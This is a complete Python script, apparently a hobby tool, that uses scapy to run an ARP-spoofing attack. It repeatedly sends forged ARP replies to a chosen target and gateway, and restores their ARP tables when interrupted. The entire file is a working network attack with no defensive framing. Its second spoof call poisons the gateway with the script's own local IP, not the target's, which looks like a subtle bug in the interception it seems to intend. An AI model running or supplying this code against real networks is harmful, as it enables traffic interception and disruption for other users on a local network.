import os
import sys
from scapy.all import *
import time

gateway = input("Gateway IP: ")
target = input("Target IP: ")
local = get_if_addr(conf.iface)

print ("Local IP: " + local)

def spoof(target_ip, gateway_ip):
        target_mac = getmacbyip(target_ip)
        packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
        send(packet, verbose=False)

def restore(dest_ip, src_ip):
        dest_mac = getmacbyip(dest_ip)
        src_mac = getmacbyip(src_ip)
        packet = ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=dest_ip, hwdst=dest_mac)
        send(packet, verbose=False)

try:
        while True:
                spoof(target, gateway)
                spoof(gateway, local)
                print ("Packet sent")
                time.sleep(2)
except KeyboardInterrupt:
        print("\nRestoring ARP tables")
        restore(target, gateway)
        restore(gateway, target)
